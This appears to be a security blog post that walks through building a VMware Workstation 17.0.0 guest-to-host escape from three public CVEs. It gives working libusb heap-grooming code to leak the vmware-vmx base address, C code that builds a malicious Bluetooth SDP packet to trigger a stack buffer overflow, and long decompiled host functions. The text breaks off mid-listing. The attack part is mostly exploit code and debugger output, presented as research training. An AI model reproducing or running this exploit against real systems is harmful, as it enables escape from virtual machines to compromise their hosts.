---
title: "VMware Guest To Host"
date: 2026-04-04 11:39:03 +/-0200
categories: [Exploit, Hypervisor]
tags: [vmware]     # TAG names should always be lowercase
image: imgs/blog/11VmwareGuestToHost/20260404230650.png
---

Good morning! Today we're going to walk through the complete process of creating a Guest-to-Host exploit in VMware (version 17.0.0). My setup is my laptop with this version installed, along with Ubuntu 20.04 LTS.

The exploits used are CVE-2023-20870, CVE-2023-34044, and CVE-2023-20869.

I did NOT discover these exploits (`;(`). In fact, there is a 107-page paper that explains these exploits in great detail:

- [https://www.nccgroup.com/media/b2chcbti/vmware-workstation-guest-to-host-escape.pdf](https://www.nccgroup.com/media/b2chcbti/vmware-workstation-guest-to-host-escape.pdf)

All credit goes to Alexander Zaviyalov for this great paper, which allowed me to use it as a guide when attempting to exploit these CVEs :D.

I should mention that this was a very fun and engaging process, as well as great training to understand the research and exploitation process of hypervisors (in this case VMware, but I'm planning to dig into Hyper-V as well).

The exploitation process is as follows:

- Memory Leak: This will be very helpful for bypassing ASLR and obtaining the base address of `vmware_vmx`. To achieve this, we will take advantage of a `malloc` with uninitialized memory in the USB Request Blocks (URBs).
- RCE: We will trigger this with a stack-based buffer overflow in the Service Discovery Protocol (SDP) implementation. For this, we will need a Bluetooth device. In my case, I tried running a VM with Windows 11 using the vulnerable version of VMware alongside Ubuntu 20.04 LTS. Unfortunately, the Bluetooth device passthrough did not work properly, so I decided to perform it on my laptop's host OS.

Now that the concept has been introduced, let's get started.

## Leak VMware Base address
For this leak, we'll need two devices, the **Virtual Bluetooth Adapter** (reader) and the **Virtual Mouse** (writer).

Both, the mouse and the Bluetooth sides use `malloc` without zeroing. Neither one cleans up properly. But they play different roles.

### Virtual Bluetooth Adapter (Reader)
First, we're going to use `lsusb` to list the USB devices and note down the **`VID`** and **`PID`**:
![](imgs/blog/11VmwareGuestToHost/20260109180009.png)

```c
uint16_t vid = 0x0e0f;
uint16_t pid = 0x0008;
```

For this leak, we will use `libusb` in our code to send URB packets.

Let's start from the beginning, the vulnerable function:
```c
// Guest가  USB Request Block 을 전송할 경우 호출, 메모리 할당 및 read/write data
VUsbURB *__fastcall VUsbBluetooth_OpNewUrb(VUsbDevice_Bluetooth *dev, unsigned int num_pkts, unsigned int num_bytes)
{
  _QWORD *v5; // rsi
  __int64 v6; // rax

  v5 = UtilSafeMalloc1(12LL * num_pkts + 0xA0);
  v5[0xF] = &unk_14132C238;
  v6 = sub_14081BEA0(*((_QWORD *)dev + 76), num_bytes);
  *v5 = v6;
  v5[0x10] = sub_1408194C0(v6);
  return (VUsbURB *)(v5 + 1);
}
```

Everything revolves around this function, **`sub_14081BEA0`**, which is a wrapper for:
```c
__int64 __fastcall sub_14081BEA0(__int64 a1, __int64 a2)
{
  return (__int64)sub_1408194D0(*(_DWORD **)(a1 + 0x268), a2);
}
```

```c
_QWORD *__fastcall sub_1408194D0(_DWORD *a1, unsigned int numbytes)
{
  _QWORD *v5; // rcx
  int v6; // edx
  unsigned int v7; // edx
  unsigned int v8; // r8d
  unsigned int v9; // eax
  bool v10; // cc
  unsigned int v11; // eax

  v5 = UtilSafeMalloc1(numbytes + 24LL);
  *(_WORD *)v5 = 0;
  *v5 = (unsigned __int64)(numbytes & 0xFFFFFF) << 16;
  v5[1] = 0;
  v5[2] = a1;
  v6 = a1[16];
  ++a1[14];
  v7 = numbytes + v6;
  v8 = a1[14];
  v9 = a1[15];
  a1[16] = v7;
  v10 = v9 <= v8;
  if ( v9 >= v8 )
  {
    if ( v7 <= a1[17] )
      return v5;
    v10 = v9 <= v8;
  }
  if ( v10 )
    v9 = v8;
  a1[15] = v9;
  v11 = a1[17];
  if ( v11 <= v7 )
    v11 = v7;
  a1[17] = v11;
  return v5;
}
```

As we can see, the memory is never initialized, therefore, as we will see next, there may be sensitive information in that buffer.
```c
void *__cdecl UtilSafeMalloc1(size_t Size)
{
  void *result; // rax

  result = malloc(Size);
  if ( !result )
  {
    if ( Size )
      unknown_libname_45();
  }
  return result;
}
```

With the help of WinDBG, we're going to observe the behavior in "real time".
![](imgs/blog/11VmwareGuestToHost/20260113001014.png)

We are going to do the following:
```c
// declare context
	libusb_context* ctx = NULL;
	status = libusb_init(&ctx);
...
...
// open a device handle with the mentioned VID and PID
	libusb_device_handle *hDevice = NULL;
	hDevice = libusb_open_device_with_vid_pid(ctx, vid, pid);
...
...
// IMPORTANT: Detach the kernel driver attached to the driver
	status = libusb_kernel_driver_active(hDevice, 0);
	if (status == 1) {
		printf("\n[Dettaching kernel driver...]\n");
		libusb_detach_kernel_driver(hDevice, 0);
	}
...
...
// Declare a buffer to get the output and send the libusb_control_transfer
	char* dataOut[0x1000];
	memset(dataOut, 0, 0x1000);
	status = libusb_control_transfer(hDevice, LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN, LIBUSB_REQUEST_GET_STATUS, 0, 0, dataOut, 0x80, 1000);
...
...
// To get the output content of the buffer we got the next printf statement:
	for (unsigned int i = 0; i < 0x20; i++) {
		printf("\n[%u] address -> 0x%p\n\t\\__Content -> [0x%0.16llx]\n", i, (void*)&dataOut[i], (unsigned long long)dataOut[i]);
	}
...
...
// cleanup
	printf("\n[BUFFER SENT SUCCESSFULLY]\n");

	libusb_release_interface(hDevice, 0);

	libusb_close(hDevice);
	hDevice = NULL;

	libusb_exit(ctx);
	ctx = NULL;
```

You might be wondering why we use `LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN` in the **`request_type`**. Well, that's a great question, since it's the core of the leak, as well as the **`bRequest`** (`LIBUSB_REQUEST_GET_STATUS`).

- **`request_type`**:
	- `LIBUSB_ENDPOINT_IN`: It sets the transfer direction to "device -> guest", meaning the host will read from the URB data buffer and send it back to the guest OS. Without this, the data flows the other direction (guest writes to the device), and we'd never receive the uninitialized heap contents. The entire leak depends on getting data back.
	- `LIBUSB_REQUEST_TYPE_CLASS`: Inside `vmware-vmx.exe`, the function **`VUsbBluetooth_OpSubmitUrb`** checks the opcode derived from `bmRequestType`. When `LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN` is used, the converted opcode becomes `AL = 0x20`, which satisfies a specific `IF` condition in that function. That code path leads to the branch where the uninitialized URB data buffer is processed and ultimately copied back to the guest's physical memory in 0x40-byte chunks. (without any content initialization)

- **`bRequest`**:
	- `LIBUSB_REQUEST_GET_STATUS`: This selects which specific sub-handler processes the request inside `vmware-vmx.exe`. It reaches the code paths where the URB data buffer's size is taken directly from the guest-controlled `wLength` without any sanitization, and the uninitialized buffer is returned.

- **`wLength`**:
	- `0x80`: It controls the size of the URB Bluetooth data buffer that `malloc` allocates on the host (`malloc(0x80 + 0x8 + 0x18) = malloc(0xb0)`). The main reason of this is heap feng shui. The mouse URB objects (allocated with `wLength = 0x0`) landed in LFH heap buckets of size `0xb0`. But a Bluetooth URB with `wLength = 0x0` goes into a `0x30` bucket. Setting `wLength = 0x80` inflates the Bluetooth URB allocation just enough to land it in the same `0xb0` bucket where the freed mouse objects still have their `.data` pointer sitting in unzeroed memory.


In summary, this is the function we are looking for: 
```c
__int64 __fastcall VUsbBluetooth_OpSubmitUrb(VUsbURB *urb)
{
  __int64 v1; // rdx
  int v3; // eax
  _QWORD *v4; // rbp
  __int64 v5; // rbx
  _QWORD *v6; // r8
  __int64 v7; // rsi
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  _WORD *v12; // rax
  __int64 v13; // rdx
  void *v14; // rbx
  char v15; // al
  __int16 v16; // ax

  v1 = *((_QWORD *)urb + 3);
  v3 = *((_DWORD *)urb + 2);
  v4 = (_QWORD *)*((_QWORD *)urb - 1);
  v5 = *((_QWORD *)urb + 15);
  v6 = *(_QWORD **)(v1 + 32);
  v7 = v6[76];
  *((_DWORD *)urb + 22) = 0;
  *((_DWORD *)urb + 3) = v3;
  v8 = *(_DWORD *)(v1 + 12);
  if ( v8 )
  {
    v9 = v8 - 2;
    if ( v9 )
    {
      v10 = v9 - 127;
      if ( !v10 )
        return sub_1407FE130(v6 + 88, (__int64)urb);
      if ( v10 == 1 )
        return sub_1407FE130(v6 + 78, (__int64)urb);
      goto LABEL_24;
    }
    sub_1408194B0(v4);
    v12 = sub_140819670(v4, 0, *((_DWORD *)urb + 2));
    v13 = 2;
    goto LABEL_8;
  }
  if ( (*(_BYTE *)v5 & 0x60) == 0x20 )
  {
    sub_1408194B0(v4);
    v12 = sub_140819670(v4, 8u, *((_DWORD *)urb + 2) - 8);
    v13 = 0;
LABEL_8:
    v14 = v12;
    sub_14081BCD0(v7, v13, v12);
    unref_sdp(v14);
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  }
  if ( VUsbDevice_OpSubmitNonReqCtl(urb) )
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  if ( (*(_BYTE *)v5 & 0x60) != 0 )
    goto LABEL_24;
  v15 = *(_BYTE *)(v5 + 1);
  if ( v15 == 9 )
  {
    if ( *(unsigned __int16 *)(v5 + 2) <= 1u )
    {
      sub_140759340(*(_QWORD *)(*((_QWORD *)urb + 3) + 32LL), *(unsigned __int16 *)(v5 + 2));
      if ( *(_WORD *)(v5 + 2) )
        sub_14081BEB0(v7);
      return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
    }
    goto LABEL_23;
  }
  if ( v15 != 11 )
  {
LABEL_24:
    *((_DWORD *)urb + 22) = 4;
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  }
  v16 = *(_WORD *)(v5 + 4);
  if ( !v16 )
  {
    if ( *(_WORD *)(v5 + 2) )
      *((_DWORD *)urb + 22) = 3;
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  }
  if ( v16 != 1 || *(_WORD *)(v5 + 2) >= 6u )
LABEL_23:
    *((_DWORD *)urb + 22) = 3;
  return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
}
```

We basically have to reach this:

![](imgs/blog/11VmwareGuestToHost/20260405190456.png)

```
0x00 -> STANDARD
0x20 -> CLASS
0x40 -> VENDOR
```

- `v8 == 0` -> use a control transfer (automatic with `libusb_control_transfer`)
- `(*(_BYTE *)v5 & 0x60) == 0x20` -> set `bmRequestType` to include `LIBUSB_REQUEST_TYPE_CLASS`
- Include `LIBUSB_ENDPOINT_IN` so the direction sends data back to the guest
- `wLength = 0x80` so the `malloc` lands in the right heap bucket

We place ourselves at the beginning of the function:

![](imgs/blog/11VmwareGuestToHost/20260113001038.png)

Here, the previously mentioned comparison is performed:

![](imgs/blog/11VmwareGuestToHost/20260123173058.png)

We can double check `al` to see the actual value:

![](imgs/blog/11VmwareGuestToHost/20260123173033.png)

Eventually, we will reach the following code:
```c
char __fastcall UHCI_UrbResponse(__int64 a1, __int64 a2)
{
  __int64 v3; // rbp
  __int64 v5; // r13
  __int64 v6; // r15
  __int64 v7; // rbx
  __int64 v8; // rax
  unsigned int v9; // edx
  int v10; // esi
  int v11; // r14d
  __int64 v12; // r15
  int v13; // eax
  int v14; // ecx
  unsigned int *v15; // rcx
  _DWORD *v16; // rdx
  __int64 v17; // r9
  int v18; // esi
  __int64 v19; // r14
  __int64 v20; // rax
  __int64 v21; // r10
  int *v22; // rcx
  int v23; // r8d
  int v24; // r9d
  __int64 v26; // [rsp+88h] [rbp+10h]

  v3 = *(_QWORD *)(a2 + 24);
  if ( *(_DWORD *)(a2 + 96) != 2 )
    return 0;
  v5 = *(int *)(v3 + 120);
  if ( (int)v5 >= *(_DWORD *)(v3 + 116) )
    return 0;
  v6 = 32 * v5;
  v26 = 32 * v5;
  while ( 1 )
  {
    v7 = *(_QWORD *)(v3 + 104);
    if ( *(_QWORD *)(v6 + v7) )
    {
      v8 = *(_QWORD *)(a2 + 144);
      v9 = *(_DWORD *)(v6 + v7 + 24);
      v10 = ((v9 >> 21) + 1) & 0x7FF;
      v11 = v10;
      if ( (unsigned int)v10 > *(_DWORD *)(v8 + 4) )
        v11 = *(_DWORD *)(v8 + 4);
      if ( v11 && (_BYTE)v9 == 105 )
      {
        v12 = *(unsigned int *)(v6 + v7 + 28);
        if ( !v12 || !PhysMem_CopyToMemory((unsigned int)v12, *(char **)(a2 + 0x80), v11, 0, 6) )
        {
          Warning("UHCI: Bad %s pointer %#I64x\n", "TDBuf", v12);
          *(_DWORD *)(a1 + 0x668) = 0xA0;
        }
        v6 = v26;
      }
...
...
```

Which is called from **``UHCICreateIOPort``**:
```c
__int64 __fastcall UHCICreateIOPort(__int64 a1)
{
  int i; // edi
  __int64 result; // rax

  for ( i = 0; i < 32; ++i )
    result = sub_1405D28E0(
               (unsigned __int16)(i + (*(_WORD *)(a1 + 1304) & 0xFFE0)),
               (unsigned int)sub_1401F7F20,
               a1,
               (unsigned int)"UHCI",
               128,
               0,
               *(_QWORD *)(a1 + 136),
               *(_DWORD *)(a1 + 2312));
  return result;
}
```

**`PhysMem_CopyToMemory`** basically copies the uninitialized buffer from the host's memory into the guest VM's physical memory, completing the data exfiltration.


Now we have the power to allocate memory buckets of our choosing in order to obtain the information that existed in that memory while it was in a free state.

### Virtual Mouse (writer)
For the mouse part, we need to declare the following **VID** and **PID**:
```c
uint16_t mouseVid = 0x0e0f;
uint16_t mousePid = 0x0003;
```

Everything revolves around the following function:
```c
_QWORD *__fastcall sub_1407592F0(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 v3; // rbx
  _QWORD *result; // rax

  v3 = 12LL * a2;
  result = UtilSafeMalloc1(v3 + a3 + 152LL);
  result[14] = &unk_14132C3B0;
  result[15] = (char *)result + v3 + 152;
  return result;
}
```

This is a constructor for a mouse URB object. It allocates a heap buffer with `UtilSafeMalloc1`, then it writes `&unk_14132C3B0` at `result[14]` (offset `+0x70`). Which is a pointer into the `.data` segment of `vmware-vmx.exe` at a fixed offset of `0x132C3B0` from the module base.

We can trigger from the guest with:
```c
...
// open mouse handle
	libusb_device_handle *hMouse = NULL;
	hMouse = libusb_open_device_with_vid_pid(ctx, mouseVid, mousePid);
...
...
// claim interface
	status = libusb_claim_interface(hMouse, 0);
...
...
// send libusb_control transfer
	char* dataOut[0x1000];
	memset(dataOut, 0, 0x1000);
	status = libusb_control_transfer(hMouse, LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_ENDPOINT_IN, LIBUSB_REQUEST_GET_DESCRIPTOR, (LIBUSB_DT_REPORT << 8), 0, dataOut, 0x0, 5000);
...
...
// cleanup
	libusb_release_interface(hMouse, 0);
	libusb_close(hMouse);
	hMouse = NULL;
	libusb_exit(ctx);
	ctx = NULL;
```

If we put a breakpoint in **`sub_1407592F0`**:

![](imgs/blog/11VmwareGuestToHost/20260130011717.png)


If we inspect **`rcx`**, at `+0x80` we can see an address relative to the `vmware-vmx` module, which we will attempt to obtain programmatically later.

![](imgs/blog/11VmwareGuestToHost/20260124001443.png)

Here we can see one of these buffers free and with uninitialized memory. The idea is to allocate many of these buffers, free them, and then immediately allocate Bluetooth buckets in the heap of size `0xb0` in order to try to capture one of these with an address relative to `vmware-vmx`.

![](imgs/blog/11VmwareGuestToHost/20260202200601.png)

![](imgs/blog/11VmwareGuestToHost/20260317152030.png)

### Leak Code
Now let's move on to the code. To begin with, we are going to allocate a large number of objects that are later freed:
```c
...
	while(pVmwareModule == NULL){
		memset(dataOut, 0, 0x1000);
		status = libusb_control_transfer(hMouse, LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_ENDPOINT_IN, LIBUSB_REQUEST_GET_DESCRIPTOR, (LIBUSB_DT_REPORT << 8), 0, dataOut, 0x0, 5000);
		if (status) {
			printf("\n[USB ERROR SENDING BUFFER] %s\n", libusb_strerror(status));
			libusb_release_interface(hMouse, 0);
			libusb_close(hMouse);
			hMouse = NULL;
			libusb_exit(ctx);
			ctx = NULL;
			return -1;
		}
		for (unsigned int i = 0; i < 100; i++) {
			status = libusb_control_transfer(hMouse, LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_ENDPOINT_IN, LIBUSB_REQUEST_GET_DESCRIPTOR, (LIBUSB_DT_REPORT << 8), 0, dataOut, 0x0, 1000);
			if (status) {
				printf("\n[USB ERROR SENDING BUFFER] %s\n", libusb_strerror(status));
				libusb_release_interface(hMouse, 0);
				libusb_close(hMouse);
				hMouse = NULL;
				libusb_exit(ctx);
				ctx = NULL;
				return -1;
			}
		}
...
```

Now we will allocate Bluetooth objects of size `0xb0` so they fall into the same heap bucket as the mouse device object. Therefore, we will allocate objects and filter the address until we get a result.
```c
...
		memset(dataOut, 0, 0x1000);
		for (unsigned int i = 0; i < 100; i++) {
			status = libusb_control_transfer(hDevice, LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN, LIBUSB_REQUEST_GET_STATUS, 0, 0, dataOut, 0x80, 1000);
			if (!status) {
				printf("\n[USB ERROR SENDING BUFFER] %s\n", libusb_strerror(status));
				libusb_release_interface(hDevice, 0);
				libusb_close(hDevice);
				hDevice = NULL;
				libusb_exit(ctx);
				ctx = NULL;
				return -1;
			}

			if (((unsigned long long)dataOut[i] & 0xfffffff000000000) && ((unsigned long long)dataOut[i] & 0x000000000000ffff) == 0xc3b0){
				pVmwareModule = (unsigned long long)dataOut[i] - 0x132c3b0;
				printf("\n[VMWARE Module Base] -> 0x%0.16llx\n\n", pVmwareModule);
				break;
			}
		}
	}
...
```

![](imgs/blog/11VmwareGuestToHost/20260318172428.png)

If we double-check, we can verify that it is indeed the module base address:

![](imgs/blog/11VmwareGuestToHost/20260318172834.png)

## Buffer Overflow
To begin with, we first need to enable the **Share bluetooth devices with the virtual machine** option. After that we need to include the following libraries:

```c
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>
//gcc exploit_4.c -o exploit_4 -lbluetooth -w
```

We also need the Bluetooth MAC address of a nearby device (in my case, I used my phone):
{% raw %}
```c
bdaddr_t bdaddr = {{0xf3,0xd9,0xf4,0xbf,0x7b,0x7c}};
```
{% endraw %}

The Bluetooth and USB mouse kernel modules must be loaded back, we removed them during the leak (`rmmod btusb`, `rmmod usbhid`), so we need run `modprobe btusb`, `modprobe usbhid`, and restart the Bluetooth service

### SDP and L2CAP
- **L2CAP** (Logical Link Control and Adaptation Protocol): a Bluetooth transport layer protocol. It provides a channel for higher-level protocols to transmit data. Think of it like TCP for Bluetooth.

- **SDP** (Service Discovery Protocol): runs on top of L2CAP. It lets Bluetooth devices discover what services each other supports (audio streaming, file transfer, etc.). It uses a client-server model where the client sends request PDUs and the server responds.

An SDP PDU (Protocol Data Unit) has this structure:

![](imgs/blog/11VmwareGuestToHost/20260405204647.png)

The PDU type we care about is **`SDP_SVC_SEARCH_ATTR_REQ`** (pdu_id = 6). This type searches a device for service records and retrieves attributes.

![](imgs/blog/11VmwareGuestToHost/20260405204831.png)

![](imgs/blog/11VmwareGuestToHost/20260405204847.png)

https://github.com/pauloborges/bluez/blob/master/lib/sdp.h#L397

#### Establishing the connection
```c
...
{% raw %}
    bdaddr_t bdaddr = {{0xf3,0xd9,0xf4,0xbf,0x7b,0x7c}};
{% endraw %}
    int l2cap_socket = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (l2cap_socket < 0) {
        printf("\nError creating L2CAP socket\n");
        return 1;
    }
    
    struct sockaddr_l2 addr = { 0 };
    addr.l2_family = AF_BLUETOOTH;
    addr.l2_psm = htobs(0x01); // L2CAP channel
    addr.l2_bdaddr = bdaddr;
    if (connect(l2cap_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("\nError connecting to the L2CAP socket\n");
        close(l2cap_socket);
        return 1;
    }else{
        printf("\n[DONE] L2CAP SOCKET\n");
    }
    sdp_session_t *session = sdp_connect(BDADDR_ANY, &bdaddr, SDP_RETRY_IF_BUSY);
    if (!session) {
        printf("\nError connecting to the SDP session\n");
        close(l2cap_socket);
        return 1;
    }
```
The PSM (Protocol Service Multiplexer) is set to `0x01` (`L2CAP_SIGNALLING_CID`). By sending an `L2CAP_CMD_CONN_REQ` packet via this channel, an SDP socket is established over L2CAP.

### Building the malicious packet
Now we need to build the malicious packet.
#### Parameter 1: ServiceSearchPattern
```c
...
reqBody[offset++] = 6 | (6<<3);                          // header byte
*((uint16_t*)&reqBody[offset]) = htons(0x00);             // data field size = 0
offset += 2;
...
```
The header byte encodes two things in a single byte. First Bits **0–2** (low 3 bits): size descriptor = 6. When size descriptor is 6, it means the data field size is specified in the following 16 bits (2 bytes). And Bits **3–7** (high 5 bits): type descriptor = 6 (`SDP_DE_SEQ`, data element sequence)

So the byte is `6 | (6 << 3) = 6 | 48 = 0x36`

This takes up 3 bytes in `reqBody` (1 header + 2 size).

#### Parameter 2: MaximumAttributeByteCount
```c
...
*((uint16_t*)&reqBody[offset]) = htons(65535);   // 0xFFFF only 2 bytes
offset += 2;
...
```
This tells the SDP server to return up to 65535 bytes of attribute data (It's not directly involved in the overflow)

#### Parameter 3: AttributeIDList (overflow trigger)
This is where the exploit gets interesting. We define two nested attribute IDs, where the second one carries the overflow payload.

First attribute ID (the container):
```c
...
uint16_t overflowSize = 0x28f;   // 655 bytes

reqBody[offset++] = 6 | (6<<3);                              // header: type=SEQ, size_desc=6
*((uint16_t*)&reqBody[offset]) = htons(overflowSize + 3);    // data field size = 0x292
offset += 2;
...
```
Same header format: type descriptor 6, size descriptor 6, so the data field size follows in 16 bits. The size is `overflowSize + 3 = 0x292`. Why +3? Because the second attribute that follows has 1 byte for its header 2 bytes for its data field size and ``0x28f`` bytes of actual data

`1 + 2 + 0x28f = 0x292`. The first attribute's size must encompass all of this.

Second attribute ID (the payload carrier):
```c
...
reqBody[offset++] = 6 | (1<<3);                              // header: type=UINT, size_desc=6
*((uint16_t*)&reqBody[offset]) = htons(overflowSize);        // data field size = 0x28f
offset += 2;
...
```
The header byte is `6 | (1 << 3) = 6 | 8 = 0x0e`. Critically, the type descriptor is 1 (`SDP_DE_UINT`) instead of 6. The value `0x0e` is what causes the code to enter **case 6** in a switch statement deep in the processing chain, which leads directly to the vulnerable function.

Then the actual data:
```c
...
memset(&reqBody[offset], 0x41, overflowSize);   // As
offset += overflowSize;
...
```

Then the continuation state of course:
```c
...
reqBody[offset++] = 0;   // no continuation
...
```
This single `0x00` byte says that this is a complete request, and it does not expect any follow-up.

Finalizing and sending the PDU.
```c
...
reqhdr->plen = htons(offset);
reqsize = sizeof(sdp_pdu_hdr_t) + offset;
sdp_send_req_w4_rsp(session, reqbuf, rspbuf, reqsize, &rspsize);
...
```
The `plen` field in the PDU header is set to the total parameter length (everything in `reqBody`). The packet is then sent using **`sdp_send_req_w4_rsp`** which writes the raw PDU to the SDP socket and waits for a response.

### Host Code Trigger
Everything starts with **`proc_search_attr_req`**, a function that we can reach through **`process_request`**.
```c
void __fastcall process_request(struct_a1_1 *req)
{
  __int64 v2; // rax
  _WORD *v3; // rax
  void *v4; // rbp
  char v5; // si
  unsigned __int16 v6; // bx
  unsigned __int16 v7; // ax
  __int64 v8; // r8
  __int64 v9; // rdx
  struct_a1_1 *v10; // rcx
  __int64 *v11; // [rsp+20h] [rbp-38h] BYREF
  char v12; // [rsp+28h] [rbp-30h] BYREF
  unsigned __int16 v13; // [rsp+29h] [rbp-2Fh]
  __int16 v14; // [rsp+2Bh] [rbp-2Dh]
  void *v15; // [rsp+30h] [rbp-28h] BYREF

  if ( *((_QWORD *)req + 6) )
  {
    v2 = *((_QWORD *)req + 5);
    if ( v2 )
    {
      while ( 1 )
      {
        if ( !(unsigned int)sub_140819490(v2) )
          return;
        if ( !RBuf_CopyOutHeader(*((_QWORD **)req + 5), (int)&v12, 5u) )
          return;
        v3 = RBuf_CopyOutData((_QWORD **)req + 5, 5, (unsigned __int16)__ROL2__(v14, 8));
        v4 = v3;
        if ( !v3 )
          return;
        v5 = v12;
        v6 = v13;
        v15 = (void *)sub_1408192B0(v3);
        v11 = 0;
        if ( v5 == 2 )
          break;
        if ( v5 == 4 )
        {
          v7 = sdp_service_attr_req(req, &v15, &v11);
          v9 = v6;
          v10 = req;
          if ( !v7 )
          {
            LOBYTE(v8) = 5;
            goto LABEL_18;
          }
          goto LABEL_16;
        }
        if ( v5 == 6 )
        {
          v7 = proc_search_attr_req(req, &v15, &v11);
          v9 = v6;
          v10 = req;
...
```

```nasm
.text:000000014086BCBE                 cmp     sil, 6
.text:000000014086BCC2                 jz      short loc_14086BCD7
```

```c
__int64 __fastcall proc_search_attr_req(struct_a1_1 *a1, _QWORD *a2, __int64 **a3)
{
  __int64 v6; // rbp
  __int64 v8; // rax
  __int64 v9; // rcx
  void *v10; // rbx
  _QWORD *v11; // rdi
  unsigned int v12; // ebx
  unsigned int v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // esi
  _WORD *v17; // rbx
  int v18; // eax
  unsigned int v19; // [rsp+30h] [rbp-78h] BYREF
  _BYTE v20[8]; // [rsp+38h] [rbp-70h] BYREF
  __int64 v21; // [rsp+40h] [rbp-68h]
  _BYTE v22[8]; // [rsp+50h] [rbp-58h] BYREF
  __int64 v23; // [rsp+58h] [rbp-50h]
  unsigned __int64 v24; // [rsp+68h] [rbp-40h] BYREF

  v6 = *(_QWORD *)(*((_QWORD *)a1 + 4) + 24LL);
  if ( !SDPData_ReadElement(a2, 6, (struct_a3 *)v20) )
    return 3;
  if ( !SDPData_ReadRawInt(a2, 2u, &v24, 0) || !SDPData_ReadElement(a2, 6, (struct_a3 *)v22) )
  {
    sub_14083BBD0(v20);
    return 3;
  }
  if ( sdp_getdatasize(a2, &v19) )
  {
    v8 = v24;
    if ( v24 < 0x21 )
      v8 = 33;
    v9 = *((_QWORD *)a1 + 6);
    v24 = v8 - 32;
    v10 = (void *)sub_14083CAB0(v9, v6, v21, v23);
    sub_14083BBD0(v20);
    sub_14083BBD0(v22);
    v11 = (_QWORD *)sub_14083CD50(v10, v6);
    unref_sdp(v10);
    v12 = v24;
    v13 = sub_140819490(v11);
    if ( v19 > v13 )
    {
      unref_sdp(v11);
      return 5;
    }
    else
    {
      _mm_lfence();
      v14 = sub_140819490(v11);
      v15 = v14 - v19;
      v16 = v12 + v19;
      if ( v15 <= v12 )
      {
        v16 = 0;
        v12 = v15;
      }
      v17 = sub_140819670(v11, v19, v12);
      unref_sdp(v11);
      v18 = sub_140819490(v17);
      sub_14083D120((_DWORD)a3, v6, 2, v18, 0);
      sub_140618800(a3);
      unref_sdp(v17);
      sub_14086C4A0(a3, v6, v16);
      return 0;
    }
  }
  else
  {
    sub_14083BBD0(v20);
    sub_14083BBD0(v22);
    return 5;
  }
}
```

The overflow itself occurs in **`sub_14083CAB0()`**:

![](imgs/blog/11VmwareGuestToHost/20260405213005.png)

Basically, our objective (already achieved with the trigger sequence) is to reach that code and avoid going down another branch.

As we can see, both the **`SDPData_ReadElement`** and **`SDPData_ReadRawInt`** functions can prevent this.
```c
char __fastcall SDPData_ReadRawInt(_QWORD *a1, unsigned int len, unsigned __int64 *a3, unsigned __int64 *a4)
{
  size_t v4; // rdi
  char result; // al
  unsigned __int64 v9; // [rsp+20h] [rbp-58h]
  unsigned __int64 v10; // [rsp+28h] [rbp-50h]
  _BYTE Src[16]; // [rsp+30h] [rbp-48h] BYREF

  v4 = len;
  result = RBuf_CopyOutHeader((_QWORD *)*a1, (int)Src, len);
  if ( result )
  {
    memcpy(&Src[-v4], Src, v4);
    *a3 = ((unsigned int)(HIWORD(v10) | HIDWORD(v10) & 0xFF0000) >> 8)
        | (((HIDWORD(v10) << 16) | WORD2(v10) & 0xFF00u) << 8)
        | (((unsigned int)v10 & 0xFF000000
          | ((v10 & 0xFF0000 | ((unsigned __int64)(((unsigned int)(v10 & 0xFF00) | ((_DWORD)v10 << 16)) << 8) << 8)) << 16)) << 8);
    if ( a4 )
      *a4 = ((unsigned int)(HIWORD(v9) | HIDWORD(v9) & 0xFF0000) >> 8)
          | ((WORD2(v9) & 0xFF00u | (HIDWORD(v9) << 16)) << 8)
          | (((unsigned int)v9 & 0xFF000000
            | ((v9 & 0xFF0000 | ((unsigned __int64)(((unsigned int)(v9 & 0xFF00) | ((_DWORD)v9 << 16)) << 8) << 8)) << 16)) << 8);
    return SDPData_Slice(a1, v4);
  }
  return result;
}
```

```c
char __fastcall SDPData_ReadElement(_QWORD *in_rbuf, int type, struct_a3 *ele)
{
  _QWORD *v3; // rdi
  unsigned int v7; // ebp
  unsigned int v8; // ebx
  int v9; // edi
  char result; // al
  unsigned int v11; // edi
  __int64 v12; // r8
  __int64 v13; // rdx
  unsigned int v14; // ecx
  int v15; // edx
  unsigned __int64 v16; // [rsp+20h] [rbp-68h] BYREF
  unsigned __int64 v17; // [rsp+28h] [rbp-60h] BYREF
  __int64 v18; // [rsp+30h] [rbp-58h] BYREF
  __int64 v19; // [rsp+38h] [rbp-50h] BYREF
  unsigned __int8 v20; // [rsp+40h] [rbp-48h] BYREF
  unsigned int v21; // [rsp+41h] [rbp-47h]

  v3 = (_QWORD *)*in_rbuf;
  v7 = 1;
  if ( !RBuf_CopyOutHeader((_QWORD *)*in_rbuf, (int)&v20, 1u) )
    return 0;
  switch ( v20 & 7 )
  {
    case 0:
      v8 = (v20 & 0xF8) != 0;
      break;
    case 1:
      v8 = 2;
      break;
    case 2:
      v8 = 4;
      break;
    case 3:
      v8 = 8;
      break;
    case 4:
      v8 = 16;
      break;
    case 5:
      v7 = 2;
      if ( !RBuf_CopyOutHeader(v3, (int)&v20, 2u) )
        return 0;
      v8 = (unsigned __int8)v21;
      break;
    case 6:
